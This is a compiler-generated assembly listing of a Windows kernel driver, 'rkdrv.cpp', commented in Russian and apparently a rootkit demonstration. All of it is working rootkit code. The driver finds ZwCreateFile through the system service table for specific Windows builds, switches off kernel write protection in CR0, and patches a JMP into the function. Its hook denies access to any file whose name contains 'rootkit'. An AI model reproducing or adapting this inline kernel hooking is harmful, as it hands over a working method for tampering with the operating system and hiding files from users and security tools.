; Listing generated by Microsoft (R) Optimizing Compiler Version 13.10.3077 

	TITLE	.\rkdrv.cpp
	.386P
include listing.inc
if @Version gt 510
.model FLAT
else
_TEXT	SEGMENT PARA USE32 PUBLIC 'CODE'
_TEXT	ENDS
_DATA	SEGMENT DWORD USE32 PUBLIC 'DATA'
_DATA	ENDS
CONST	SEGMENT DWORD USE32 PUBLIC 'CONST'
CONST	ENDS
_BSS	SEGMENT DWORD USE32 PUBLIC 'BSS'
_BSS	ENDS
$$SYMBOLS	SEGMENT BYTE USE32 'DEBSYM'
$$SYMBOLS	ENDS
_TLS	SEGMENT DWORD USE32 PUBLIC 'TLS'
_TLS	ENDS
;	COMDAT ??_C@_05OJIGFHBO@?$CFws?5?6?$AA@
CONST	SEGMENT DWORD USE32 PUBLIC 'CONST'
CONST	ENDS
;	COMDAT ??_C@_1BA@HCIIBKCA@?$AAr?$AAo?$AAo?$AAt?$AAk?$AAi?$AAt?$AA?$AA@
CONST	SEGMENT DWORD USE32 PUBLIC 'CONST'
CONST	ENDS
;	COMDAT ??_C@_0BA@BONEEJAC@Lock?5file?5?$CB?$CB?$CB?$CB?6?$AA@
CONST	SEGMENT DWORD USE32 PUBLIC 'CONST'
CONST	ENDS
;	COMDAT ?SetHookCode@@YGXUTInterceptInfo@@H@Z
_TEXT	SEGMENT PARA USE32 PUBLIC 'CODE'
_TEXT	ENDS
;	COMDAT ?MyZwCreateFile@@YGJPAPAXKPAU_OBJECT_ATTRIBUTES@@PAU_IO_STATUS_BLOCK@@PAT_LARGE_INTEGER@@KKKKPAXK@Z
_TEXT	SEGMENT PARA USE32 PUBLIC 'CODE'
_TEXT	ENDS
;	COMDAT ?InterceptFunction@@YGXAAUTInterceptInfo@@PAD@Z
_TEXT	SEGMENT PARA USE32 PUBLIC 'CODE'
_TEXT	ENDS
;	COMDAT ?DeleteKiSTHook@@YGXXZ
_TEXT	SEGMENT PARA USE32 PUBLIC 'CODE'
_TEXT	ENDS
;	COMDAT ?DriverUnload@@YGXPAU_DRIVER_OBJECT@@@Z
_TEXT	SEGMENT PARA USE32 PUBLIC 'CODE'
_TEXT	ENDS
;	COMDAT ?DriverEntry@@YGJPAU_DRIVER_OBJECT@@PAU_UNICODE_STRING@@@Z
_TEXT	SEGMENT PARA USE32 PUBLIC 'CODE'
_TEXT	ENDS
FLAT	GROUP _DATA, CONST, _BSS
	ASSUME	CS: FLAT, DS: FLAT, SS: FLAT
endif

INCLUDELIB LIBCMT
INCLUDELIB OLDNAMES

PUBLIC	?gpDeviceObject@@3PAU_DEVICE_OBJECT@@A		; gpDeviceObject
PUBLIC	?gpDeviceContext@@3PAU_DEVICE_CONTEXT@@A	; gpDeviceContext
PUBLIC	?ZwCreateFileInfo@@3UTInterceptInfo@@A		; ZwCreateFileInfo
_BSS	SEGMENT
?gpDeviceObject@@3PAU_DEVICE_OBJECT@@A DD 01H DUP (?)	; gpDeviceObject
?gpDeviceContext@@3PAU_DEVICE_CONTEXT@@A DD 01H DUP (?)	; gpDeviceContext
?ZwCreateFileInfo@@3UTInterceptInfo@@A DB 012H DUP (?)	; ZwCreateFileInfo
_BSS	ENDS
PUBLIC	?SetHookCode@@YGXUTInterceptInfo@@H@Z		; SetHookCode
; Function compile flags: /Ogty
; File e:\delphi5\delphi7\projects\bhv\rkkm2\rkdrv.cpp
;	COMDAT ?SetHookCode@@YGXUTInterceptInfo@@H@Z
_TEXT	SEGMENT
_OldCR0$ = -4						; size = 4
_InterceptInfo$ = 8					; size = 18
_ASetHook$ = 28						; size = 4
?SetHookCode@@YGXUTInterceptInfo@@H@Z PROC NEAR		; SetHookCode, COMDAT

; 35   : {

	push	ecx

; 36   :  DWORD OldCR0;	
; 37   :  // Сброс WP бита
; 38   : _asm {
; 39   :     mov eax,CR0 

	mov	eax, cr0

; 40   :     mov OldCR0,eax

	mov	DWORD PTR _OldCR0$[esp+4], eax

; 41   :     and eax,0xFFFEFFFF			

	and	eax, -65537				; fffeffffH

; 42   :     mov cr0, eax

	mov	cr0, eax

; 43   :  }
; 44   : 
; 45   :  if (ASetHook)

	mov	eax, DWORD PTR _ASetHook$[esp]
	test	eax, eax

; 46   :   memcpy(InterceptInfo.FunctionAddr, &InterceptInfo.HookJMP[0], 5);

	mov	eax, DWORD PTR _InterceptInfo$[esp]
	je	SHORT $L9937
	mov	edx, DWORD PTR _InterceptInfo$[esp+16]
	mov	ecx, DWORD PTR _InterceptInfo$[esp+13]
	shr	edx, 8

; 47   :  else

	jmp	SHORT $L10010
$L9937:

; 48   :   memcpy(InterceptInfo.FunctionAddr, &InterceptInfo.FunctCode[0], 5);

	mov	ecx, DWORD PTR _InterceptInfo$[esp+8]
	mov	dl, BYTE PTR _InterceptInfo$[esp+12]
$L10010:
	mov	DWORD PTR [eax], ecx
	mov	BYTE PTR [eax+4], dl

; 49   :  // Восстановление WP бита
; 50   :  _asm {
; 51   : 	 mov eax,OldCR0		

	mov	eax, DWORD PTR _OldCR0$[esp+4]

; 52   :      mov cr0,eax

	mov	cr0, eax

; 53   :  }
; 54   : }

	pop	ecx
	ret	24					; 00000018H
?SetHookCode@@YGXUTInterceptInfo@@H@Z ENDP		; SetHookCode
_TEXT	ENDS
PUBLIC	?MyZwCreateFile@@YGJPAPAXKPAU_OBJECT_ATTRIBUTES@@PAU_IO_STATUS_BLOCK@@PAT_LARGE_INTEGER@@KKKKPAXK@Z ; MyZwCreateFile
PUBLIC	??_C@_05OJIGFHBO@?$CFws?5?6?$AA@		; `string'
PUBLIC	??_C@_1BA@HCIIBKCA@?$AAr?$AAo?$AAo?$AAt?$AAk?$AAi?$AAt?$AA?$AA@ ; `string'
PUBLIC	??_C@_0BA@BONEEJAC@Lock?5file?5?$CB?$CB?$CB?$CB?6?$AA@ ; `string'
EXTRN	_wcsstr:NEAR
EXTRN	__imp__ZwCreateFile@44:NEAR
EXTRN	_DbgPrint:NEAR
;	COMDAT ??_C@_05OJIGFHBO@?$CFws?5?6?$AA@
CONST	SEGMENT
??_C@_05OJIGFHBO@?$CFws?5?6?$AA@ DB '%ws ', 0aH, 00H	; `string'
CONST	ENDS
;	COMDAT ??_C@_1BA@HCIIBKCA@?$AAr?$AAo?$AAo?$AAt?$AAk?$AAi?$AAt?$AA?$AA@
CONST	SEGMENT
??_C@_1BA@HCIIBKCA@?$AAr?$AAo?$AAo?$AAt?$AAk?$AAi?$AAt?$AA?$AA@ DB 'r', 00H
	DB	'o', 00H, 'o', 00H, 't', 00H, 'k', 00H, 'i', 00H, 't', 00H, 00H
	DB	00H						; `string'
CONST	ENDS
;	COMDAT ??_C@_0BA@BONEEJAC@Lock?5file?5?$CB?$CB?$CB?$CB?6?$AA@
CONST	SEGMENT
??_C@_0BA@BONEEJAC@Lock?5file?5?$CB?$CB?$CB?$CB?6?$AA@ DB 'Lock file !!!!'
	DB	0aH, 00H					; `string'
; Function compile flags: /Ogty
CONST	ENDS
;	COMDAT ?MyZwCreateFile@@YGJPAPAXKPAU_OBJECT_ATTRIBUTES@@PAU_IO_STATUS_BLOCK@@PAT_LARGE_INTEGER@@KKKKPAXK@Z
_TEXT	SEGMENT
$T10026 = -20						; size = 18
$T10019 = -20						; size = 18
_FileHandle$ = 8					; size = 4
_DesiredAccess$ = 12					; size = 4
_OldCR0$10022 = 16					; size = 4
_OldCR0$10015 = 16					; size = 4
_ObjectAttributes$ = 16					; size = 4
_IoStatusBlock$ = 20					; size = 4
_AllocationSize$ = 24					; size = 4
_FileAttributes$ = 28					; size = 4
_ShareAccess$ = 32					; size = 4
_CreateDisposition$ = 36				; size = 4
_CreateOptions$ = 40					; size = 4
_EaBuffer$ = 44						; size = 4
_EaLength$ = 48						; size = 4
?MyZwCreateFile@@YGJPAPAXKPAU_OBJECT_ATTRIBUTES@@PAU_IO_STATUS_BLOCK@@PAT_LARGE_INTEGER@@KKKKPAXK@Z PROC NEAR ; MyZwCreateFile, COMDAT

; 69   : {

	sub	esp, 20					; 00000014H
	push	esi

; 70   :  
; 71   :    DbgPrint("%ws \n", ObjectAttributes->ObjectName->Buffer);

	mov	esi, DWORD PTR _ObjectAttributes$[esp+20]
	mov	eax, DWORD PTR [esi+8]
	mov	ecx, DWORD PTR [eax+4]
	push	ecx
	push	OFFSET FLAT:??_C@_05OJIGFHBO@?$CFws?5?6?$AA@
	call	_DbgPrint

; 72   :    // Блокировка доступа к файлу, содержащему строку "rootkit"
; 73   :    if (wcsstr(ObjectAttributes->ObjectName->Buffer, L"rootkit") != NULL) {

	mov	edx, DWORD PTR [esi+8]
	mov	eax, DWORD PTR [edx+4]
	push	OFFSET FLAT:??_C@_1BA@HCIIBKCA@?$AAr?$AAo?$AAo?$AAt?$AAk?$AAi?$AAt?$AA?$AA@
	push	eax
	call	_wcsstr
	add	esp, 16					; 00000010H
	test	eax, eax
	je	SHORT $L9953

; 74   : 	   DbgPrint("Lock file !!!!\n");

	push	OFFSET FLAT:??_C@_0BA@BONEEJAC@Lock?5file?5?$CB?$CB?$CB?$CB?6?$AA@
	call	_DbgPrint
	add	esp, 4

; 75   : 	   return STATUS_ACCESS_DENIED;

	mov	eax, -1073741790			; c0000022H
	pop	esi

; 92   : }

	add	esp, 20					; 00000014H
	ret	44					; 0000002cH
$L9953:

; 76   :    }
; 77   :    // Вызов исходной функции
; 78   :    NTSTATUS Res;
; 79   :    // Повышение приоритета
; 80   : //   KIRQL OldIRQL = KeRaiseIrqlToDpcLevel();			 
; 81   :    // Восстановление машинного кода функции
; 82   :    SetHookCode(ZwCreateFileInfo, false);

	mov	eax, DWORD PTR ?ZwCreateFileInfo@@3UTInterceptInfo@@A+12
	mov	edx, DWORD PTR ?ZwCreateFileInfo@@3UTInterceptInfo@@A+4
	mov	ecx, DWORD PTR ?ZwCreateFileInfo@@3UTInterceptInfo@@A
	mov	DWORD PTR $T10019[esp+36], eax
	mov	ax, WORD PTR ?ZwCreateFileInfo@@3UTInterceptInfo@@A+16
	mov	DWORD PTR $T10019[esp+28], edx
	mov	edx, DWORD PTR ?ZwCreateFileInfo@@3UTInterceptInfo@@A+8
	mov	WORD PTR $T10019[esp+40], ax
	mov	eax, cr0
	mov	DWORD PTR _OldCR0$10015[esp+20], eax
	and	eax, -65537				; fffeffffH
	mov	cr0, eax
	mov	DWORD PTR [ecx], edx
	mov	dl, BYTE PTR $T10019[esp+36]
	mov	BYTE PTR [ecx+4], dl
	mov	eax, DWORD PTR _OldCR0$10015[esp+20]
	mov	cr0, eax

; 83   :    // Вызов функции
; 84   :    Res = ZwCreateFile(FileHandle, DesiredAccess, ObjectAttributes, 
; 85   : 	  IoStatusBlock, AllocationSize, FileAttributes, ShareAccess,
; 86   : 	  CreateDisposition, CreateOptions, EaBuffer, EaLength);

	mov	eax, DWORD PTR _EaLength$[esp+20]
	mov	ecx, DWORD PTR _EaBuffer$[esp+20]
	mov	edx, DWORD PTR _CreateOptions$[esp+20]
	push	eax
	mov	eax, DWORD PTR _CreateDisposition$[esp+24]
	push	ecx
	mov	ecx, DWORD PTR _ShareAccess$[esp+28]
	push	edx
	mov	edx, DWORD PTR _FileAttributes$[esp+32]
	push	eax
	mov	eax, DWORD PTR _AllocationSize$[esp+36]
	push	ecx
	mov	ecx, DWORD PTR _IoStatusBlock$[esp+40]
	push	edx
	mov	edx, DWORD PTR _DesiredAccess$[esp+44]
	push	eax
	mov	eax, DWORD PTR _FileHandle$[esp+48]
	push	ecx
	push	esi
	push	edx
	push	eax
	call	DWORD PTR __imp__ZwCreateFile@44

; 87   :    // Установка кода JMP в начало функции
; 88   :    SetHookCode(ZwCreateFileInfo, true);

	mov	ecx, DWORD PTR ?ZwCreateFileInfo@@3UTInterceptInfo@@A
	mov	edx, eax
	mov	eax, DWORD PTR ?ZwCreateFileInfo@@3UTInterceptInfo@@A+4
	mov	DWORD PTR $T10026[esp+28], eax
	mov	eax, DWORD PTR ?ZwCreateFileInfo@@3UTInterceptInfo@@A+8
	mov	DWORD PTR $T10026[esp+32], eax
	mov	eax, DWORD PTR ?ZwCreateFileInfo@@3UTInterceptInfo@@A+12
	mov	DWORD PTR $T10026[esp+36], eax
	mov	ax, WORD PTR ?ZwCreateFileInfo@@3UTInterceptInfo@@A+16
	mov	WORD PTR $T10026[esp+40], ax
	mov	eax, cr0
	mov	DWORD PTR _OldCR0$10022[esp+20], eax
	and	eax, -65537				; fffeffffH
	mov	cr0, eax
	mov	eax, DWORD PTR $T10026[esp+37]
	mov	DWORD PTR [ecx], eax
	mov	ax, WORD PTR $T10026[esp+40]
	shr	ax, 8
	mov	BYTE PTR [ecx+4], al
	mov	eax, DWORD PTR _OldCR0$10022[esp+20]
	mov	cr0, eax

; 89   :    // Восстановление приоритета
; 90   :   // KeLowerIrql(OldIRQL);
; 91   :    return Res;

	mov	eax, edx
	pop	esi

; 92   : }

	add	esp, 20					; 00000014H
	ret	44					; 0000002cH
?MyZwCreateFile@@YGJPAPAXKPAU_OBJECT_ATTRIBUTES@@PAU_IO_STATUS_BLOCK@@PAT_LARGE_INTEGER@@KKKKPAXK@Z ENDP ; MyZwCreateFile
_TEXT	ENDS
PUBLIC	?InterceptFunction@@YGXAAUTInterceptInfo@@PAD@Z	; InterceptFunction
EXTRN	__imp_@KfLowerIrql@4:NEAR
EXTRN	__imp__KeRaiseIrqlToDpcLevel@0:NEAR
; Function compile flags: /Ogty
;	COMDAT ?InterceptFunction@@YGXAAUTInterceptInfo@@PAD@Z
_TEXT	SEGMENT
$T10035 = -20						; size = 18
_InterceptInfo$ = 8					; size = 4
_OldCR0$10031 = 12					; size = 4
_HookAddr$ = 12						; size = 4
?InterceptFunction@@YGXAAUTInterceptInfo@@PAD@Z PROC NEAR ; InterceptFunction, COMDAT

; 95   : {

	sub	esp, 20					; 00000014H
	push	ebx
	push	esi
	push	edi

; 96   :  // Повышение приоритета
; 97   :  KIRQL OldIRQL = KeRaiseIrqlToDpcLevel();	

	call	DWORD PTR __imp__KeRaiseIrqlToDpcLevel@0

; 98   :  // Запоминаем адрес функции-перехватчика
; 99   :  InterceptInfo.HookAddr = HookAddr;

	mov	edx, DWORD PTR _HookAddr$[esp+28]
	mov	cl, al
	mov	eax, DWORD PTR _InterceptInfo$[esp+28]

; 100  :  // Подготовка команды JMP в буфере HookJMP
; 101  :  DWORD JMP_Rel = (DWORD)InterceptInfo.HookAddr - ((DWORD)InterceptInfo.FunctionAddr + 5);

	mov	esi, DWORD PTR [eax]
	mov	DWORD PTR [eax+4], edx

; 102  :  InterceptInfo.HookJMP[0] = 0xE9;
; 103  :  memcpy(&InterceptInfo.HookJMP[1], &JMP_Rel, 4);

	sub	edx, esi
	mov	BYTE PTR [eax+13], 233			; 000000e9H
	sub	edx, 5
	mov	DWORD PTR [eax+14], edx

; 104  :  // Копирование машинного кода перехватываемой функции в FunctCode
; 105  :  memcpy(&InterceptInfo.FunctCode[0], InterceptInfo.FunctionAddr, 5);

	mov	edi, DWORD PTR [esi]
	lea	edx, DWORD PTR [eax+8]
	mov	DWORD PTR [edx], edi
	mov	bl, BYTE PTR [esi+4]
	mov	BYTE PTR [edx+4], bl

; 106  :  // Перехват
; 107  :  SetHookCode(InterceptInfo, true);

	mov	edx, esi
	mov	esi, DWORD PTR [eax+4]
	mov	DWORD PTR $T10035[esp+36], esi
	mov	esi, DWORD PTR [eax+8]
	mov	DWORD PTR $T10035[esp+40], esi
	mov	esi, DWORD PTR [eax+12]
	mov	ax, WORD PTR [eax+16]
	mov	DWORD PTR $T10035[esp+44], esi
	mov	WORD PTR $T10035[esp+48], ax
	mov	eax, cr0
	mov	DWORD PTR _OldCR0$10031[esp+28], eax
	and	eax, -65537				; fffeffffH
	mov	cr0, eax
	mov	eax, DWORD PTR $T10035[esp+45]
	mov	DWORD PTR [edx], eax
	mov	ax, WORD PTR $T10035[esp+48]
	shr	ax, 8
	mov	BYTE PTR [edx+4], al
	mov	eax, DWORD PTR _OldCR0$10031[esp+28]
	mov	cr0, eax

; 108  :  // Восстановление приоритета
; 109  :  KeLowerIrql(OldIRQL);

	call	DWORD PTR __imp_@KfLowerIrql@4
	pop	edi
	pop	esi
	pop	ebx

; 110  : }

	add	esp, 20					; 00000014H
	ret	8
?InterceptFunction@@YGXAAUTInterceptInfo@@PAD@Z ENDP	; InterceptFunction
_TEXT	ENDS
PUBLIC	?DeleteKiSTHook@@YGXXZ				; DeleteKiSTHook
; Function compile flags: /Ogty
;	COMDAT ?DeleteKiSTHook@@YGXXZ
_TEXT	SEGMENT
_OldCR0$10040 = -24					; size = 4
$T10044 = -20						; size = 18
?DeleteKiSTHook@@YGXXZ PROC NEAR			; DeleteKiSTHook, COMDAT

; 114  : {

	sub	esp, 24					; 00000018H
	push	esi

; 115  :  // Повышение приоритета
; 116  :  KIRQL OldIRQL = KeRaiseIrqlToDpcLevel();			 

	call	DWORD PTR __imp__KeRaiseIrqlToDpcLevel@0

; 117  :  // Восстановление машинного кода перехваченной функции
; 118  :  SetHookCode(ZwCreateFileInfo, false);

	mov	edx, DWORD PTR ?ZwCreateFileInfo@@3UTInterceptInfo@@A
	mov	esi, DWORD PTR ?ZwCreateFileInfo@@3UTInterceptInfo@@A+8
	mov	cl, al
	mov	eax, DWORD PTR ?ZwCreateFileInfo@@3UTInterceptInfo@@A+4
	mov	DWORD PTR $T10044[esp+32], eax
	mov	eax, DWORD PTR ?ZwCreateFileInfo@@3UTInterceptInfo@@A+12
	mov	DWORD PTR $T10044[esp+40], eax
	mov	ax, WORD PTR ?ZwCreateFileInfo@@3UTInterceptInfo@@A+16
	mov	WORD PTR $T10044[esp+44], ax
	mov	eax, cr0
	mov	DWORD PTR _OldCR0$10040[esp+28], eax
	and	eax, -65537				; fffeffffH
	mov	cr0, eax
	mov	al, BYTE PTR $T10044[esp+40]
	mov	DWORD PTR [edx], esi
	mov	BYTE PTR [edx+4], al
	mov	eax, DWORD PTR _OldCR0$10040[esp+28]
	mov	cr0, eax
	pop	esi

; 121  : }

	add	esp, 24					; 00000018H

; 119  :  // Восстановление приоритета
; 120  :  KeLowerIrql(OldIRQL);

	jmp	DWORD PTR __imp_@KfLowerIrql@4
?DeleteKiSTHook@@YGXXZ ENDP				; DeleteKiSTHook
_TEXT	ENDS
PUBLIC	?DriverUnload@@YGXPAU_DRIVER_OBJECT@@@Z		; DriverUnload
; Function compile flags: /Ogty
;	COMDAT ?DriverUnload@@YGXPAU_DRIVER_OBJECT@@@Z
_TEXT	SEGMENT
_pDriverObject$ = 8					; size = 4
?DriverUnload@@YGXPAU_DRIVER_OBJECT@@@Z PROC NEAR	; DriverUnload, COMDAT

; 127  :  DeleteKiSTHook();

	call	?DeleteKiSTHook@@YGXXZ			; DeleteKiSTHook

; 128  :  return;
; 129  : }

	ret	4
?DriverUnload@@YGXPAU_DRIVER_OBJECT@@@Z ENDP		; DriverUnload
_TEXT	ENDS
PUBLIC	?DriverEntry@@YGJPAU_DRIVER_OBJECT@@PAU_UNICODE_STRING@@@Z ; DriverEntry
EXTRN	_KeServiceDescriptorTable:DWORD
EXTRN	_NtBuildNumber:DWORD
; Function compile flags: /Ogty
;	COMDAT ?DriverEntry@@YGJPAU_DRIVER_OBJECT@@PAU_UNICODE_STRING@@@Z
_TEXT	SEGMENT
_pDriverObject$ = 8					; size = 4
_pusRegistryPath$ = 12					; size = 4
?DriverEntry@@YGJPAU_DRIVER_OBJECT@@PAU_UNICODE_STRING@@@Z PROC NEAR ; DriverEntry, COMDAT

; 134  : 	// Определение адреса функции ZwCreateFile по KiST
; 135  : 	ZwCreateFileInfo.FunctionAddr = NULL;
; 136  : 	switch (*NtBuildNumber) {

	mov	eax, DWORD PTR _NtBuildNumber
	mov	DWORD PTR ?ZwCreateFileInfo@@3UTInterceptInfo@@A, 0
	movzx	eax, WORD PTR [eax]
	cmp	eax, 2195				; 00000893H
	je	SHORT $L9980
	cmp	eax, 2600				; 00000a28H
	je	SHORT $L9982
	cmp	eax, 3790				; 00000eceH
	jne	SHORT $L10050

; 143  :      case 3790:  // W2K3
; 144  :       ZwCreateFileInfo.FunctionAddr = (PCHAR)*KeServiceDescriptorTable->ntoskrnl.ServiceTable[0x27];	 

	mov	ecx, DWORD PTR _KeServiceDescriptorTable
	mov	edx, DWORD PTR [ecx]
	mov	eax, DWORD PTR [edx+156]

; 145  : 	  break;

	jmp	SHORT $L10051
$L9982:

; 139  : 	  break;
; 140  :      case 2600:   // Win XP
; 141  :       ZwCreateFileInfo.FunctionAddr = (PCHAR)*KeServiceDescriptorTable->ntoskrnl.ServiceTable[0x25];	 

	mov	eax, DWORD PTR _KeServiceDescriptorTable
	mov	ecx, DWORD PTR [eax]
	mov	eax, DWORD PTR [ecx+148]

; 142  : 	  break;

	jmp	SHORT $L10051
$L9980:

; 137  :      case  2195:  // Win 2k
; 138  :       ZwCreateFileInfo.FunctionAddr = (PCHAR)*KeServiceDescriptorTable->ntoskrnl.ServiceTable[0x20];	 

	mov	edx, DWORD PTR _KeServiceDescriptorTable
	mov	eax, DWORD PTR [edx]
	mov	eax, DWORD PTR [eax+128]
$L10051:

; 146  : 	}	
; 147  : 	// Адрес не определен ? Тогда выход
; 148  : 	if (ZwCreateFileInfo.FunctionAddr == NULL)

	test	eax, eax
	mov	DWORD PTR ?ZwCreateFileInfo@@3UTInterceptInfo@@A, eax
	jne	SHORT $L9986
$L10050:

; 149  : 		return STATUS_NOT_SUPPORTED;

	mov	eax, -1073741637			; c00000bbH

; 156  : }

	ret	8
$L9986:

; 150  : 	// Установка перехватчика
; 151  : 	InterceptFunction(ZwCreateFileInfo, (PCHAR)*MyZwCreateFile);

	push	OFFSET FLAT:?MyZwCreateFile@@YGJPAPAXKPAU_OBJECT_ATTRIBUTES@@PAU_IO_STATUS_BLOCK@@PAT_LARGE_INTEGER@@KKKKPAXK@Z ; MyZwCreateFile
	push	OFFSET FLAT:?ZwCreateFileInfo@@3UTInterceptInfo@@A ; ZwCreateFileInfo
	call	?InterceptFunction@@YGXAAUTInterceptInfo@@PAD@Z ; InterceptFunction

; 152  :     // Подключение обработчика выгрузки драйвера
; 153  :     pDriverObject->DriverUnload  = DriverUnload;

	mov	ecx, DWORD PTR _pDriverObject$[esp-4]
	mov	DWORD PTR [ecx+52], OFFSET FLAT:?DriverUnload@@YGXPAU_DRIVER_OBJECT@@@Z ; DriverUnload

; 154  : 	// Возврат результата инициализации
; 155  :     return STATUS_SUCCESS;

	xor	eax, eax

; 156  : }

	ret	8
?DriverEntry@@YGJPAU_DRIVER_OBJECT@@PAU_UNICODE_STRING@@@Z ENDP ; DriverEntry
_TEXT	ENDS
END
